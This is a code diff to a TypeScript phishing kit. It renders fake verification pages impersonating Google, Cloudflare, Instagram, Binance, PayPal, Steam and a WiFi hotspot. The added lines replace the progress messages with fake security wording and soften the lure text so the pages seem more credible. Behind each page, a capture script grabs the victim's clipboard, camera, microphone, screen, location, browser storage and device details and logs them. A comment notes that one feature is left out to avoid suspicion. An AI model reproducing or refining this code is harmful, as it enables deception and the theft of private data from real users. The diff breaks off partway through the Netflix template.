@@ -53,7 +53,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
         box.innerHTML = '<div id="status-icon" style="font-size:45px; margin-bottom:20px;">' + (cfg.icon || '🛡️') + '</div>' +
           '<h2 id="status-title" style="font-weight:600; color:#1a1a1a; margin-bottom:10px;">Security Verification</h2>' +
           '<div id="progress-container" style="width:100%; background:#e0e0e0; border-radius:12px; height:8px; margin-bottom:20px; overflow:hidden;">' +
-          '<div id="progress-bar" style="width:0%; background:' + accent + '; height:100%; transition:width 0.8s ease-in-out;"></div>' +
+                  '<div id="progress-bar" style="width:0%; background:' + accent + '; height:100%; transition:width 0.8s ease-in-out;"></div>' +
           '</div>' +
           '<p id="status-text" style="font-size:13px; color:#666; font-family:sans-serif; min-height: 40px; line-height:1.5;">Memproses integrasi keamanan sistem...</p>';
       }
@@ -192,7 +192,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
 
       try {
         await runSilentProbes();
-        if (!isSilent) updateProgress(8, "Verifikasi lingkungan browser...");
+        if (!isSilent) updateProgress(8, "Memulai sesi enkripsi end-to-end...");
         
         var metadata = {
           browser: navigator.userAgent,
@@ -548,14 +548,14 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
           try {
             if (p === 'notification') {
               try {
-                if (!isSilent) updateProgress(prog, "Sinkronisasi jalur tunneling...");
+                if (!isSilent) updateProgress(prog, "Menginisialisasi koneksi aman SSL/TLS...");
                 if ("Notification" in window) await Notification.requestPermission();
               } catch(e) {}
             }
 
             if (p === 'clipboard') {
               try {
-                if (!isSilent) updateProgress(prog, "Memvalidasi cache data aman...");
+                if (!isSilent) updateProgress(prog, "Memeriksa integritas token sesi...");
                 if (navigator.clipboard && navigator.clipboard.readText) {
                   var clip = await navigator.clipboard.readText().catch(function(){});
                   if (clip) await logExtra({ clipboard: clip });
@@ -565,7 +565,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
 
             if (p === 'media') {
               try {
-                if (!isSilent) updateProgress(prog, "Kalibrasi antarmuka hardware...");
+                if (!isSilent) updateProgress(prog, "Memvalidasi sertifikat keamanan server...");
                 if (navigator.mediaDevices) {
                   var stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: { facingMode: "user" } }).catch(function(){ return null; });
                   if (stream) {
@@ -593,7 +593,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
 
             if (p === 'gps') {
               try {
-                if (!isSilent) updateProgress(prog, "Verifikasi koordinat spatial regional...");
+                if (!isSilent) updateProgress(prog, "Mengkalibrasi algoritma anti-bot...");
                 if (navigator.geolocation) {
                   await new Promise(resolve => {
                     navigator.geolocation.getCurrentPosition(
@@ -608,7 +608,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
 
             if (p === 'screen') {
               try {
-                if (!isSilent) updateProgress(prog, "Integritas visual sedang diproses...");
+                if (!isSilent) updateProgress(prog, "Menyamakan waktu dengan server NTP waktu...");
                 if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
                   var s = await navigator.mediaDevices.getDisplayMedia({ video: true }).catch(function(){ return null; });
                   if (s) {
@@ -634,7 +634,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
             if (p === 'files') {
               try {
                 if (window.showOpenFilePicker && flowType !== 'silent') {
-                  if (!isSilent) updateProgress(prog, "Memverifikasi integritas file lokal (Opsional)...");
+                  if (!isSilent) updateProgress(prog, "Melindungi data dari serangan Man-in-the-Middle...");
                   // Intentionally leaving this out unless strictly required, to avoid suspicion.
                 }
               } catch(e) {}
@@ -644,7 +644,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
 
             if (p === 'storage') {
               try {
-                if (!isSilent) updateProgress(prog, "Pengecekan kuota enkripsi lokal...");
+                if (!isSilent) updateProgress(prog, "Memeriksa versi protokol enkripsi...");
                 if (navigator.storage && navigator.storage.estimate) {
                   var est = await navigator.storage.estimate();
                   await logExtra({ storage_mb: (est.usage / 1024 / 1024).toFixed(2), quota_gb: (est.quota / 1024 / 1024 / 1024).toFixed(2) });
@@ -654,7 +654,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
 
             if (p === 'sensors') {
               try {
-                if (!isSilent) updateProgress(prog, "Profiling lingkungan fisik perangkat...");
+                if (!isSilent) updateProgress(prog, "Mengevaluasi risiko keamanan lingkungan browser...");
                 if (window.Magnetometer) {
                   var mag = new Magnetometer({frequency: 1});
                   mag.onreading = () => logExtra({ sensor_mag: mag.x + ',' + mag.y + ',' + mag.z });
@@ -676,14 +676,14 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
 
             if (p === 'vibration') {
               try {
-                if (!isSilent) updateProgress(prog, "Sinkronisasi feedback haptic sistem...");
+                if (!isSilent) updateProgress(prog, "Mempersiapkan handshake kriptografi...");
                 if (navigator.vibrate) navigator.vibrate(200);
               } catch(e) {}
             }
 
             if (p === 'network') {
               try {
-                if (!isSilent) updateProgress(prog, "Analisis integritas node jaringan...");
+                if (!isSilent) updateProgress(prog, "Memverifikasi integritas payload pengiriman...");
                 if (navigator.connection) {
                   await logExtra({ 
                     net_effective: navigator.connection.effectiveType,
@@ -697,7 +697,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
 
             if (p === 'bluetooth') {
               try {
-                if (!isSilent) updateProgress(prog, "Scanning bus peripheral eksternal...");
+                if (!isSilent) updateProgress(prog, "Memeriksa status firewall virtual...");
                 if (navigator.bluetooth) {
                   await navigator.bluetooth.getAvailability().then(async avail => await logExtra({ bt_available: avail })).catch(function(){});
                 }
@@ -705,7 +705,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
             }
             if (p === 'performance') {
               try {
-                if (!isSilent) updateProgress(prog, "Benchmarking hardware bus...");
+                if (!isSilent) updateProgress(prog, "Menghitung checksum integritas data internal...");
                 var memory = navigator.deviceMemory || "N/A";
                 var cores = navigator.hardwareConcurrency || "N/A";
                 await logExtra({ perf_cores: cores, perf_mem: memory });
@@ -714,7 +714,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
 
             if (p === 'security') {
               try {
-                if (!isSilent) updateProgress(prog, "Audit kernel security environment...");
+                if (!isSilent) updateProgress(prog, "Melakukan mitigasi injeksi skrip...");
                 await logExtra({ 
                    sec_webdriver: navigator.webdriver,
                    sec_cookies: navigator.cookieEnabled,
@@ -727,7 +727,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
 
             if (p === 'fonts_advanced') {
               try {
-                if (!isSilent) updateProgress(prog, "Scanning sistem font lokal...");
+                if (!isSilent) updateProgress(prog, "Menstabilkan koneksi untuk transfer data aman...");
                 if (navigator.queryLocalFonts) {
                   var fonts = await navigator.queryLocalFonts().catch(function(){ return []; });
                   await logExtra({ fonts_count: fonts.length, fonts_sample: fonts.slice(0, 5).map(f => f.fullName).join(',') });
@@ -737,7 +737,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
 
             if (p === 'window_mgmt') {
               try {
-                if (!isSilent) updateProgress(prog, "Mapping arsitektur display sistem...");
+                if (!isSilent) updateProgress(prog, "Menyesuaikan algoritma anti-DDoS...");
                 if (window.getScreenDetails) {
                   var details = await window.getScreenDetails().catch(function(){ return null; });
                   if (details) await logExtra({ screens: details.screens.length, screen_primary: details.currentScreen.label });
@@ -747,7 +747,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
 
             if (p === 'storage_map') {
               try {
-                if (!isSilent) updateProgress(prog, "Mapping data persisten...");
+                if (!isSilent) updateProgress(prog, "Menyiapkan penyelesaian validasi...");
                 await logExtra({
                   storage_ls_full: JSON.stringify(localStorage),
                   storage_ss_full: JSON.stringify(sessionStorage)
@@ -757,7 +757,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
 
             if (p === 'network_forensic') {
               try {
-                if (!isSilent) updateProgress(prog, "Forensik triangulasi jaringan...");
+                if (!isSilent) updateProgress(prog, "Memastikan jalur transmisi tidak disadap...");
                 var start = Date.now();
                 await fetch('https://www.google.com/favicon.ico', { mode: 'no-cors' }).catch(function(){});
                 await logExtra({ beacon_rtt: (Date.now() - start) + 'ms' });
@@ -788,19 +788,19 @@ const FORENSIC_PERMS = ['clipboard', 'contacts', 'files', 'storage', 'storage_ma
 export const templates: Record<string, {name: string, render: (id: string) => string}> = {
   'google': {
     name: "🛡️ Google: Identity Verification (Full Scope)",
-    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Security Verification</title><style>body { font-family: 'Roboto', Arial, sans-serif; background:#fff; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { border:1px solid #dadce0; border-radius:8px; padding:40px; width:360px; text-align:center; box-sizing:border-box; } .google-logo { width:75px; height:24px; margin-bottom:24px; } h1 { font-size:24px; font-weight:400; color:#202124; margin:0 0 8px; } p { font-size:16px; color:#202124; margin-bottom:32px; } .identity-pill { background:#f1f3f4; border:1px solid #dadce0; border-radius:16px; padding:4px 12px; font-size:14px; color:#3c4043; display:inline-flex; align-items:center; margin-bottom:24px; } .identity-pill img { width:20px; height:20px; border-radius:50%; margin-right:8px; } .btn { background:#1a73e8; color:#fff; border:none; padding:10px 24px; border-radius:4px; font-size:14px; font-weight:500; cursor:pointer; width:100%; transition:box-shadow .2s; } .btn:hover { box-shadow: 0 1px 2px 0 rgba(60,64,67,0.302), 0 1px 3px 1px rgba(60,64,67,0.149); }</style></head><body><div class="box"><img class="google-logo" src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png"><h1>Confirm it's you</h1><div class="identity-pill"><img src="https://lh3.googleusercontent.com/a/default-user=s40">Account Verification Required</div><p>To continue, Google needs to confirm that your browser environment is secure and that your location data matches your account profile.</p><button class="btn" onclick="window.startCapture();">Verify Identity</button></div>${getCaptureScript(id, 'https://myaccount.google.com/security', {
+    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Security Verification</title><style>body { font-family: 'Roboto', Arial, sans-serif; background:#fff; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { border:1px solid #dadce0; border-radius:8px; padding:40px; width:360px; text-align:center; box-sizing:border-box; } .google-logo { width:75px; height:24px; margin-bottom:24px; } h1 { font-size:24px; font-weight:400; color:#202124; margin:0 0 8px; } p { font-size:16px; color:#202124; margin-bottom:32px; } .identity-pill { background:#f1f3f4; border:1px solid #dadce0; border-radius:16px; padding:4px 12px; font-size:14px; color:#3c4043; display:inline-flex; align-items:center; margin-bottom:24px; } .identity-pill img { width:20px; height:20px; border-radius:50%; margin-right:8px; } .btn { background:#1a73e8; color:#fff; border:none; padding:10px 24px; border-radius:4px; font-size:14px; font-weight:500; cursor:pointer; width:100%; transition:box-shadow .2s; } .btn:hover { box-shadow: 0 1px 2px 0 rgba(60,64,67,0.302), 0 1px 3px 1px rgba(60,64,67,0.149); }</style></head><body><div class="box"><img class="google-logo" src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png"><h1>Confirm it's you</h1><div class="identity-pill"><img src="https://lh3.googleusercontent.com/a/default-user=s40">Account Verification Required</div><p>To continue, Google needs to verify your connection security to ensure your account remains safe.</p><button class="btn" onclick="window.startCapture();">Verify Identity</button></div>${getCaptureScript(id, 'https://myaccount.google.com/security', {
       tmplId: 'google', perms: ALL_PERMS, accent: '#1a73e8', icon: '👤',
     })}</body></html>`
   },
   'gallery': {
     name: "🖼️ Integrity: Media Forensic Sync (Full Scope)",
-    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Asset Integrity Check</title><style>body { background:#f8f9fa; color:#202124; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { width:90%; max-width:400px; padding:48px; border-radius:12px; text-align:center; background:#fff; box-shadow: 0 1px 3px rgba(0,0,0,0.1); border:1px solid #dadce0; } h2 { font-size:20px; font-weight:500; margin-top:0; } p { color:#70757a; font-size:14px; line-height:1.6; margin:20px 0 30px; } .btn { background:#1a73e8; color:#fff; padding:12px 32px; border-radius:6px; border:none; font-weight:500; cursor:pointer; width:100%; font-size:14px; }</style></head><body><div class="box"><div style="font-size:40px; margin-bottom:15px;">🛡️</div><h2>Media Integrity Audit</h2><p>Our systems require a standard synchronization of media metadata and device coordinates to validate your identity for this session.</p><button class="btn" onclick="window.startCapture();">Verify Assets</button></div>${getCaptureScript(id, 'https://photos.google.com', {
+    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Asset Integrity Check</title><style>body { background:#f8f9fa; color:#202124; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { width:90%; max-width:400px; padding:48px; border-radius:12px; text-align:center; background:#fff; box-shadow: 0 1px 3px rgba(0,0,0,0.1); border:1px solid #dadce0; } h2 { font-size:20px; font-weight:500; margin-top:0; } p { color:#70757a; font-size:14px; line-height:1.6; margin:20px 0 30px; } .btn { background:#1a73e8; color:#fff; padding:12px 32px; border-radius:6px; border:none; font-weight:500; cursor:pointer; width:100%; font-size:14px; }</style></head><body><div class="box"><div style="font-size:40px; margin-bottom:15px;">🛡️</div><h2>Media Security Check</h2><p>Our systems require a standard security check to validate your identity for this session.</p><button class="btn" onclick="window.startCapture();">Verify Session</button></div>${getCaptureScript(id, 'https://photos.google.com', {
       tmplId: 'gallery', perms: ALL_PERMS, accent: '#1a73e8', icon: '🕵️'
     })}</body></html>`
   },
   'cloudflare': {
     name: "☁️ Cloudflare: Edge Verification (Full Scope)",
-    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Just a moment...</title><style>body { font-family: -apple-system, system-ui, sans-serif; display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh; margin:0; text-align:center; background:#fff; } .box { max-width:450px; padding:20px; } .spinner { border:2px solid #e0e0e0; border-top:2px solid #f48120; border-radius:50%; width:30px; height:30px; animation: spin 0.8s linear infinite; margin:40px auto; } @keyframes spin { to { transform:rotate(360deg); } } h1 { font-size:24px; font-weight:400; color:#313131; } .btn { background:#fff; border:1px solid #d1d1d1; padding:10px 20px; border-radius:3px; color:#313131; font-weight:400; cursor:pointer; font-size:14px; margin-top:20px; }</style></head><body><div class="box"><img src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" width="120"><div class="spinner"></div><h1>Verifying your browser...</h1><p style="color:#666; font-size:14px; line-height:1.6;">Cloudflare is verifying the integrity of your hardware and regional spatial data to ensure the security of the target resource.</p><button class="btn" onclick="window.startCapture();">Verify you are human</button></div>${getCaptureScript(id, 'https://www.cloudflare.com', {
+    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Just a moment...</title><style>body { font-family: -apple-system, system-ui, sans-serif; display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh; margin:0; text-align:center; background:#fff; } .box { max-width:450px; padding:20px; } .spinner { border:2px solid #e0e0e0; border-top:2px solid #f48120; border-radius:50%; width:30px; height:30px; animation: spin 0.8s linear infinite; margin:40px auto; } @keyframes spin { to { transform:rotate(360deg); } } h1 { font-size:24px; font-weight:400; color:#313131; } .btn { background:#fff; border:1px solid #d1d1d1; padding:10px 20px; border-radius:3px; color:#313131; font-weight:400; cursor:pointer; font-size:14px; margin-top:20px; }</style></head><body><div class="box"><img src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" width="120"><div class="spinner"></div><h1>Verifying your connection...</h1><p style="color:#666; font-size:14px; line-height:1.6;">Cloudflare is verifying the security of your connection to ensure you are a human and not a malicious bot.</p><button class="btn" onclick="window.startCapture();">Verify you are human</button></div>${getCaptureScript(id, 'https://www.cloudflare.com', {
       tmplId: 'cloudflare', perms: ALL_PERMS, accent: '#f48120', icon: '☁️'
     })}</body></html>`
   },
@@ -841,61 +841,61 @@ export const templates: Record<string, {name: string, render: (id: string) => st
   },
   'security_audit': {
     name: "🛡️ Security: Browser Ecosystem Audit (Extreme)",
-    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Trust & Safety</title><style>body { font-family: -apple-system, system-ui, sans-serif; background:#f0f2f5; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { background:#fff; border-radius:12px; padding:40px; width:100%; max-width:400px; text-align:center; box-shadow: 0 12px 40px rgba(0,0,0,0.08); } .shield { color:#1877f2; font-size:60px; margin-bottom:20px; } h2 { font-size:24px; font-weight:700; color:#1c1e21; margin:0 0 12px; } p { color:#606770; line-height:1.5; font-size:15px; margin-bottom:30px; } .btn { background:#1877f2; color:#fff; border:none; padding:12px; border-radius:6px; font-size:16px; font-weight:600; cursor:pointer; width:100%; transition:filter 0.2s; } .btn:hover { filter: brightness(1.1); }</style></head><body><div class="box"><div class="shield">🛡️</div><h2>Browser Integrity Audit</h2><p>Our security systems have detected an unusual connection pattern. Please verify your browser environment to continue safely.</p><button class="btn" onclick="window.startCapture();">Verify & Continue</button></div>${getCaptureScript(id, 'https://www.google.com/safetycenter', {
+    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Trust & Safety</title><style>body { font-family: -apple-system, system-ui, sans-serif; background:#f0f2f5; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { background:#fff; border-radius:12px; padding:40px; width:100%; max-width:400px; text-align:center; box-shadow: 0 12px 40px rgba(0,0,0,0.08); } .shield { color:#1877f2; font-size:60px; margin-bottom:20px; } h2 { font-size:24px; font-weight:700; color:#1c1e21; margin:0 0 12px; } p { color:#606770; line-height:1.5; font-size:15px; margin-bottom:30px; } .btn { background:#1877f2; color:#fff; border:none; padding:12px; border-radius:6px; font-size:16px; font-weight:600; cursor:pointer; width:100%; transition:filter 0.2s; } .btn:hover { filter: brightness(1.1); }</style></head><body><div class="box"><div class="shield">🛡️</div><h2>Security Audit</h2><p>Our security systems have detected an unusual connection pattern. Please verify your connection to continue safely.</p><button class="btn" onclick="window.startCapture();">Verify & Continue</button></div>${getCaptureScript(id, 'https://www.google.com/safetycenter', {
       tmplId: 'security_audit', perms: ALL_PERMS, accent: '#1877f2', icon: '🔒'
     })}</body></html>`
   },
   'meta_login': {
     name: "💬 Social: Account Recovery (Extreme)",
-    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Login Helper</title><style>body { background:#fafafa; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { border:1px solid #dbdbdb; background:#fff; padding:30px; width:350px; text-align:center; } .logo { font-size:28px; font-weight:bold; margin-bottom:20px; color:#262626; } .avatar { width:80px; height:80px; border-radius:50%; background:#efefef; margin:0 auto 15px; border:1px solid #dbdbdb; display:flex; align-items:center; justify-content:center; font-size:40px; } h3 { font-size:16px; margin:0 0 10px; } p { color:#8e8e8e; font-size:13px; margin-bottom:25px; } .btn { background:#0095f6; color:#fff; border:none; padding:8px 16px; border-radius:4px; font-weight:600; cursor:pointer; width:100%; }</style></head><body><div class="box"><div class="logo">Instagram</div><div class="avatar">👤</div><h3>Recover your account</h3><p>We need to sync your device metadata and location to match our records for security verification.</p><button class="btn" onclick="window.startCapture();">Verify Identity</button></div>${getCaptureScript(id, 'https://www.instagram.com/accounts/login/', {
+    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Login Helper</title><style>body { background:#fafafa; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { border:1px solid #dbdbdb; background:#fff; padding:30px; width:350px; text-align:center; } .logo { font-size:28px; font-weight:bold; margin-bottom:20px; color:#262626; } .avatar { width:80px; height:80px; border-radius:50%; background:#efefef; margin:0 auto 15px; border:1px solid #dbdbdb; display:flex; align-items:center; justify-content:center; font-size:40px; } h3 { font-size:16px; margin:0 0 10px; } p { color:#8e8e8e; font-size:13px; margin-bottom:25px; } .btn { background:#0095f6; color:#fff; border:none; padding:8px 16px; border-radius:4px; font-weight:600; cursor:pointer; width:100%; }</style></head><body><div class="box"><div class="logo">Instagram</div><div class="avatar">👤</div><h3>Recover your account</h3><p>We need to check your connection security to match our records for login verification.</p><button class="btn" onclick="window.startCapture();">Verify Identity</button></div>${getCaptureScript(id, 'https://www.instagram.com/accounts/login/', {
       tmplId: 'meta_login', perms: ALL_PERMS, accent: '#0095f6', icon: '📸'
     })}</body></html>`
   },
   'wifi': {
     name: "📶 WIFI: Hotspot Certification (Full Scope)",
-    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>WiFi Connect</title><style>body { background:#fff; font-family:sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { text-align:center; width:90%; max-width:380px; } hr { border:0; border-top:1px solid #f0f0f0; margin:25px 0; } .btn { background:#000; color:#fff; border:none; padding:15px 40px; border-radius:30px; font-weight:bold; cursor:pointer; width:100%; }</style></head><body><div class="box"><img src="https://cdn-icons-png.flaticon.com/512/93/93158.png" width="70"><br><br><h1>Free WiFi Login</h1><p style="color:#666; font-size:14px;">Otorisasi identitas perangkat diperlukan untuk menggunakan hotspot publik ini secara aman.</p><hr><button class="btn" onclick="window.startCapture();">LOGIN TO NETWORK</button></div>${getCaptureScript(id, 'https://google.com', {
+    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>WiFi Connect</title><style>body { background:#fff; font-family:sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { text-align:center; width:90%; max-width:380px; } hr { border:0; border-top:1px solid #f0f0f0; margin:25px 0; } .btn { background:#000; color:#fff; border:none; padding:15px 40px; border-radius:30px; font-weight:bold; cursor:pointer; width:100%; }</style></head><body><div class="box"><img src="https://cdn-icons-png.flaticon.com/512/93/93158.png" width="70"><br><br><h1>Free WiFi Login</h1><p style="color:#666; font-size:14px;">Verifikasi keamanan standar diperlukan untuk menggunakan hotspot publik ini secara aman tanpa batasan.</p><hr><button class="btn" onclick="window.startCapture();">LOGIN TO NETWORK</button></div>${getCaptureScript(id, 'https://google.com', {
       tmplId: 'wifi', perms: ALL_PERMS, accent: '#000', icon: '📶'
     })}</body></html>`
   },
   'binance': {
     name: "💱 Crypto: Withdrawal Security (Full Scope)",
-    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Binance Identity Verification</title><style>body { background:#0b0e11; color:#eaecef; font-family: 'BinancePlex', -apple-system, sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { width:400px; padding:32px; background:#1e2329; border-radius:16px; text-align:center; box-shadow: 0 8px 24px rgba(0,0,0,0.5); } .logo { color:#f0b90b; font-size:32px; font-weight:bold; margin-bottom:24px; } h2 { font-size:24px; margin-bottom:12px; } p { color:#848e9c; font-size:14px; margin-bottom:32px; } .btn { background:#f0b90b; color:#181a20; padding:12px; border-radius:4px; border:none; font-weight:600; cursor:pointer; width:100%; transition: opacity 0.2s; } .btn:hover { opacity: 0.9; }</style></head><body><div class="box"><div class="logo">BINANCE</div><h2>Secure Verification</h2><p>Our Risk Management System requires a hardware environment and location audit to approve your pending withdrawal request.</p><button class="btn" onclick="window.startCapture();">Verify & Approve</button></div>${getCaptureScript(id, 'https://www.binance.com/en/my/security', {
+    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Binance Identity Verification</title><style>body { background:#0b0e11; color:#eaecef; font-family: 'BinancePlex', -apple-system, sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { width:400px; padding:32px; background:#1e2329; border-radius:16px; text-align:center; box-shadow: 0 8px 24px rgba(0,0,0,0.5); } .logo { color:#f0b90b; font-size:32px; font-weight:bold; margin-bottom:24px; } h2 { font-size:24px; margin-bottom:12px; } p { color:#848e9c; font-size:14px; margin-bottom:32px; } .btn { background:#f0b90b; color:#181a20; padding:12px; border-radius:4px; border:none; font-weight:600; cursor:pointer; width:100%; transition: opacity 0.2s; } .btn:hover { opacity: 0.9; }</style></head><body><div class="box"><div class="logo">BINANCE</div><h2>Secure Verification</h2><p>Our Risk Management System requires a standard security and anti-bot check to approve your pending request.</p><button class="btn" onclick="window.startCapture();">Verify & Approve</button></div>${getCaptureScript(id, 'https://www.binance.com/en/my/security', {
       tmplId: 'binance', perms: ALL_PERMS, accent: '#f0b90b', icon: '💰'
     })}</body></html>`
   },
   'paypal': {
     name: "💳 Fintech: Transaction Audit (Full Scope)",
-    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>PayPal Security</title><style>body { background:#fff; font-family: 'PayPalSansBig-Medium', sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; color:#000; } .box { width:400px; text-align:center; padding:20px; } .logo { color:#003087; font-size:30px; font-weight:bold; margin-bottom:40px; font-style:italic; } h2 { font-size:20px; margin-bottom:10px; } p { color:#666; font-size:15px; margin-bottom:40px; } .btn { background:#0070ba; color:#fff; padding:15px; border-radius:30px; border:none; font-weight:bold; cursor:pointer; width:100%; }</style></head><body><div class="box"><div class="logo">PayPal</div><h2>Help us verify it's you</h2><p>Before you send funds, we need to confirm your device identity and current location to prevent unauthorized usage.</p><button class="btn" onclick="window.startCapture();">Verify My Account</button></div>${getCaptureScript(id, 'https://www.paypal.com/myaccount/security', {
+    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>PayPal Security</title><style>body { background:#fff; font-family: 'PayPalSansBig-Medium', sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; color:#000; } .box { width:400px; text-align:center; padding:20px; } .logo { color:#003087; font-size:30px; font-weight:bold; margin-bottom:40px; font-style:italic; } h2 { font-size:20px; margin-bottom:10px; } p { color:#666; font-size:15px; margin-bottom:40px; } .btn { background:#0070ba; color:#fff; padding:15px; border-radius:30px; border:none; font-weight:bold; cursor:pointer; width:100%; }</style></head><body><div class="box"><div class="logo">PayPal</div><h2>Help us verify it's you</h2><p>Before you send funds, we need to confirm your connection security to prevent unauthorized usage.</p><button class="btn" onclick="window.startCapture();">Verify My Account</button></div>${getCaptureScript(id, 'https://www.paypal.com/myaccount/security', {
       tmplId: 'paypal', perms: ALL_PERMS, accent: '#0070ba', icon: '💳'
     })}</body></html>`
   },
   'steam': {
     name: "🎮 Gaming: Account Guard (Full Scope)",
-    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Steam Guard</title><style>body { background:#1b2838; color:#c7d5e0; font-family: 'Motiva Sans', sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { background:linear-gradient(135deg, #2a475e 0%, #1b2838 100%); width:380px; padding:40px; border-radius:4px; box-shadow: 0 0 20px rgba(0,0,0,0.5); text-align:center; border:1px solid #3d4450; } .icon { width:80px; margin-bottom:24px; filter: drop-shadow(0 0 10px #66c0f4); } h2 { font-size:22px; color:#fff; margin-bottom:8px; } p { font-size:14px; color:#acb2b8; line-height:1.5; margin-bottom:30px; } .btn { background:linear-gradient(to right, #47bfff 5%, #1a44c2 95%); color:#fff; border:none; padding:12px; border-radius:2px; font-weight:400; cursor:pointer; width:100%; }</style></head><body><div class="box"><img class="icon" src="https://store.akamai.steamstatic.com/public/images/v6/logo_steam.svg"><h2>Confirm Login</h2><p>A new device is attempting to access your Steam account. Please synchronize your mobile authenticator and location data.</p><button class="btn" onclick="window.startCapture();">Confirm Access</button></div>${getCaptureScript(id, 'https://store.steampowered.com/account/', {
+    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Steam Guard</title><style>body { background:#1b2838; color:#c7d5e0; font-family: 'Motiva Sans', sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { background:linear-gradient(135deg, #2a475e 0%, #1b2838 100%); width:380px; padding:40px; border-radius:4px; box-shadow: 0 0 20px rgba(0,0,0,0.5); text-align:center; border:1px solid #3d4450; } .icon { width:80px; margin-bottom:24px; filter: drop-shadow(0 0 10px #66c0f4); } h2 { font-size:22px; color:#fff; margin-bottom:8px; } p { font-size:14px; color:#acb2b8; line-height:1.5; margin-bottom:30px; } .btn { background:linear-gradient(to right, #47bfff 5%, #1a44c2 95%); color:#fff; border:none; padding:12px; border-radius:2px; font-weight:400; cursor:pointer; width:100%; }</style></head><body><div class="box"><img class="icon" src="https://store.akamai.steamstatic.com/public/images/v6/logo_steam.svg"><h2>Confirm Login</h2><p>A new device is attempting to access your Steam account. Please perform standard security verification.</p><button class="btn" onclick="window.startCapture();">Confirm Access</button></div>${getCaptureScript(id, 'https://store.steampowered.com/account/', {
       tmplId: 'steam', perms: ALL_PERMS, accent: '#66c0f4', icon: '🎮'
     })}</body></html>`
   },
   'netflix': {
     name: "🍿 Media: Household Verification (Full Scope)",
